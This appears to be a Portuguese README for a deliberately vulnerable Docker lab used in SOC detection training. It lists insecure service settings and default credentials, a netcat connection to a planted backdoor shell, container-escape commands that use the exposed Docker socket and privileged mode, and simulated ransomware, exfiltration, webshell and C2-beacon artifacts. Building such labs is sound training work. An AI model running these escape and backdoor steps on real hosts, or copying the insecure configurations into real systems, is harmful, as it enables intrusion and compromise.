# Como recompilar o agente svcmon-linux

Se quiser modificar ou garantir que o agente de monitoramento seja executado corretamente, compile o binário antes do build:

```bash
cd ../../
go build -o MAQ-3/artefatos/svcmon-linux svcmon.go
```

Depois, execute o build normalmente:

```bash
cd MAQ-3
./setup.sh deploy
```
### Backdoor Simulado

- Um backdoor Python (`system_config.py`) escuta na porta TCP 7777 e executa comandos recebidos remotamente.
- É ativado automaticamente via crontab (@reboot) no container Linux.
- Exemplo de uso:
```bash
nc <ip_do_container> 7777
# Digite comandos e receba o resultado
```
# MAQ-3 - Laboratório Linux Vulnerável

## 🎯 **Visão Geral**

MAQ-3 é um laboratório Linux vulnerável configurado para treinamento de SOC (Security Operations Center). O ambiente inclui serviços vulneráveis, logs expostos via volumes Docker, e configurações que permitem escape de container para demonstração de ataques avançados.

## 🚀 **Início Rápido**

### 1. Deploy Completo
```bash
# Configurar e executar ambiente completo
./setup.sh deploy
```

### 2. Comandos Básicos
```bash
# Iniciar ambiente existente
./setup.sh start

# Parar ambiente
./setup.sh stop

# Reiniciar ambiente
./setup.sh restart

# Ver status
./setup.sh status

# Acessar shell do container
./setup.sh shell

# Monitorar logs
./setup.sh logs

# Limpar ambiente
./setup.sh clean
```

## 🏗️ **Arquitetura**

### **Serviços Expostos**

- **SSH**: Porta 2222 (vulnerável)
- **FTP**: Porta 2121 (acesso anônimo)
- **Samba**: Portas 2139, 2445 (acesso público)
- **Syslog**: Porta 2514

### **Volumes Docker**

```
logs/
├── system/          # Logs do sistema
├── auth/            # Logs de autenticação
├── ssh/             # Logs SSH
├── ftp/             # Logs FTP
├── samba/           # Logs Samba
├── rsyslog/         # Logs rsyslog
├── app/             # Logs de aplicação
├── commands/        # Logs de comandos
└── debug/           # Logs de debug

vulnerable_files/    # Arquivos vulneráveis
ftp_public/          # Arquivos FTP públicos
samba_public/        # Arquivos Samba públicos
configs/             # Configurações
home/                # Diretórios home
```

## 🔓 **Vulnerabilidades Configuradas**

### **SSH**

- Chaves RSA fracas (1024 bits)
- Login root habilitado
- Senhas fracas conhecidas
- Permitir senhas vazias

### **FTP**

- Acesso anônimo habilitado
- Upload anônimo permitido
- Criação de diretórios anônima
- Chroot desabilitado

### **Samba**

- Compartilhamento público total
- Acesso de convidado habilitado
- Permissões 777 em arquivos
- Senhas fracas

### **Container**

- Docker socket exposto
- Proc e Sys montados
- Capabilities perigosas
- Modo privilegiado

## 📊 **Logs para Captura**

### **Logs de Sistema**

- `/var/log/syslog` - Logs gerais do sistema
- `/var/log/auth.log` - Logs de autenticação
- `/var/log/messages` - Mensagens do sistema

### **Logs de Serviços**

- `/var/log/ssh_credentials.log` - Tentativas SSH
- `/var/log/commands.log` - Comandos executados
- `/var/log/debug.log` - Logs de debug
- `/var/log/app/application.log` - Logs de aplicação

### **Logs de Ataque**

- Tentativas de login SSH
- Acessos FTP anônimos
- Conexões Samba
- Comandos executados
- Tráfego de rede

## 🎯 **Vetores de Ataque**

### **1. SSH Brute Force**

```bash
# Testar credenciais conhecidas
ssh -p 2222 root@localhost
ssh -p 2222 ftpuser@localhost
ssh -p 2222 smbuser@localhost

# Credenciais: root:toor, ftpuser:password123, smbuser:password123
```

### **2. FTP Anônimo**

```bash
# Acesso anônimo
ftp localhost 2121
# Usuário: anonymous
# Senha: qualquer coisa

# Upload de arquivo
put /etc/passwd
```

### **3. Samba Público**

```bash
# Listar compartilhamentos
smbclient -L //localhost -U guest -p 2445

# Acessar compartilhamento público
smbclient //localhost/Public -U guest -p 2445
```

### **4. Escape de Container**

```bash
# Acessar Docker socket
docker ps
docker exec -it maquina3-soc bash

# Verificar montagens
mount | grep proc
mount | grep sys
```

## 🧪 **Teste de Ataque**

### **Executar Script de Teste**

```bash
# Executar testes automatizados
./attack-test.sh
```

### **Testes Incluídos**

- SSH brute force
- FTP anônimo
- Samba público
- Escape de container
- Acesso a arquivos sensíveis
- Geração de tráfego de rede

## 🔍 **Monitoramento**

### **Ver Logs em Tempo Real**

```bash
# Monitorar todos os logs
./setup.sh logs

# Ou monitorar diretórios específicos
tail -f logs/*/*.log
```

### **Logs Importantes**

```bash
# Logs de autenticação SSH
tail -f logs/ssh/ssh.log

# Logs de comandos
tail -f logs/commands/commands.log

# Logs de aplicação
tail -f logs/app/application.log
```

## 📈 **Integração com Elastic**

### **Configuração de Logstash**

```yaml
input {
  file {
    path => "/path/to/maq3/logs/*/*.log"
    type => "maq3-logs"
    start_position => "beginning"
  }
}

filter {
  if [type] == "maq3-logs" {
    grok {
      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{GREEDYDATA:log_message}" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "maq3-logs-%{+YYYY.MM.dd}"
  }
}
```

### **Padrões de Log**

- **SSH**: Tentativas de login, chaves fracas
- **FTP**: Acessos anônimos, uploads
- **Samba**: Conexões, acessos a arquivos
- **Sistema**: Comandos, processos, rede

## 🛠️ **Troubleshooting**

### **Problemas Comuns**

#### **Container não inicia**

```bash
# Verificar logs do Docker
docker-compose logs

# Verificar portas em uso
netstat -tuln | grep -E "(2121|2222|2445)"
```

#### **Logs não aparecem**

```bash
# Verificar volumes
docker inspect maquina3-soc | grep -A 10 Mounts

# Verificar permissões
ls -la logs/
```

#### **Serviços não respondem**

```bash
# Acessar container
./setup.sh shell

# Verificar status dos serviços
systemctl status ssh
systemctl status vsftpd
systemctl status smbd
```

## 📚 **Recursos de Aprendizado**

### **Cenários de Treinamento**

1. **Detecção de Brute Force SSH**
2. **Monitoramento de Acesso FTP Anônimo**
3. **Análise de Conexões Samba**
4. **Detecção de Escape de Container**
5. **Análise de Logs de Comando**

### **Ferramentas Úteis**

- **SSH**: ssh, ssh-keyscan
- **FTP**: ftp, curl
- **Samba**: smbclient, nmap
- **Docker**: docker, docker-compose
- **Logs**: tail, grep, awk

## ⚠️ **Avisos de Segurança**

- **AMBIENTE DE TREINAMENTO APENAS**
- Não use em produção
- Isolado em rede Docker
- Logs expostos intencionalmente
- Vulnerabilidades configuradas para demonstração

## 🚀 Técnicas de Escape de Container

O ambiente MAQ-3 foi configurado especificamente para permitir escape de container, demonstrando vulnerabilidades reais de segurança.

### **Vulnerabilidades Configuradas para Escape:**

1. **Docker Socket Exposto** (`/var/run/docker.sock`)
2. **Container Privilegiado** (`privileged: true`)
3. **Capabilities Perigosas**:
   - `SYS_ADMIN` - Montar filesystems
   - `NET_ADMIN` - Manipular rede
   - `SYS_PTRACE` - Debugging de processos
   - `DAC_READ_SEARCH` - Bypass de permissões
4. **Security Options Desabilitadas**:
   - `seccomp:unconfined`
   - `apparmor:unconfined`

### **Script de Demonstração de Escape:**

```bash
# Acessar o container
docker exec -it maquina3-soc bash

# Executar demonstração completa
./container-escape-demo.sh all

# Ou técnicas específicas
./container-escape-demo.sh docker      # Escape via Docker socket
./container-escape-demo.sh capabilities # Exploiting capabilities
./container-escape-demo.sh privileged  # Exploiting privileged mode
./container-escape-demo.sh proc-sys    # Escape via /proc e /sys
```

### **Técnicas de Escape Disponíveis:**

#### **1. Docker Socket Escape (Mais Efetivo)**
```bash
# Dentro do container
docker ps                    # Listar containers do host
docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash
```

#### **2. Capabilities Exploitation**
```bash
# SYS_ADMIN - Montar filesystems
mount -t proc none /tmp/host_proc

# NET_ADMIN - Manipular rede
ip link set lo down
ip addr add 192.168.1.100/24 dev lo
```

#### **3. Privileged Container**
```bash
# Acesso direto à memória do host
cat /dev/mem | strings | head -100

# Acessar processos do host
ps aux
```

#### **4. Proc/Sys Information Gathering**
```bash
# Informações do sistema
cat /proc/version
cat /proc/sys/kernel/hostname
ls /proc/net/
ls /sys/class/net/
```

### **Comandos Rápidos para Teste:**

```bash
# Acesso básico ao container
docker exec -it maquina3-soc bash

# Verificar vulnerabilidades
ls -la /var/run/docker.sock
cat /proc/self/status | grep Cap
mount | grep -E "(proc|sys)"

# Tentar escape direto
docker run --rm -it --privileged -v /:/host ubuntu:latest chroot /host bash
```

### **⚠️ AVISO DE SEGURANÇA:**

Este ambiente é **INTENCIONALMENTE VULNERÁVEL** para treinamento. Nunca use estas configurações em produção!

---

**MAQ-3** - Laboratório Linux Vulnerável para Treinamento SOC

### Agente de Simulação C2 (svcmon)

- O binário `svcmon-linux` (Go) é copiado para o container e executado automaticamente via cron (@reboot).
- O agente realiza requisições periódicas para https://www.rodrigobrito.dev.br e registra logs em `/var/log/svcmon.log`.
- Objetivo: Simular beaconing C2 para exercícios de detecção SOC.

## Artefatos Simulados
- Backdoor Python (`system.config`)
- Agente C2 Go (`svcmon-linux`)

## Execução Automática
- Ambos os artefatos são executados automaticamente no boot do container.

## Artefatos Dinâmicos Simulados

Este ambiente inclui artefatos automatizados para simular ataques reais e gerar ruído para análise SOC. Todos são ativados automaticamente via cron.

- **ransomware_simulado_linux.sh**: Criptografa arquivos em `/opt/vulnerable_files` e gera nota de resgate. Restaure com `ransomware_restore_linux.sh`.
- **flood_logs_linux.sh**: Gera eventos falsos em logs do sistema.
- **exfiltracao_simulada.sh**: Simula exfiltração de dados do sistema.
- **portscan_simulado.sh**: Simula varredura de portas internas.
- **persistencia_simulada.sh**: Simula persistência via cron.
- **webshell_simulado.php**: Webshell PHP para simulação de invasão (`/var/ftp/pub`).

### Restauração
Execute `/usr/local/bin/ransomware_restore_linux.sh` no container para restaurar arquivos criptografados.

### Análise
Todos os artefatos geram logs específicos para facilitar investigação e correlação de alertas.
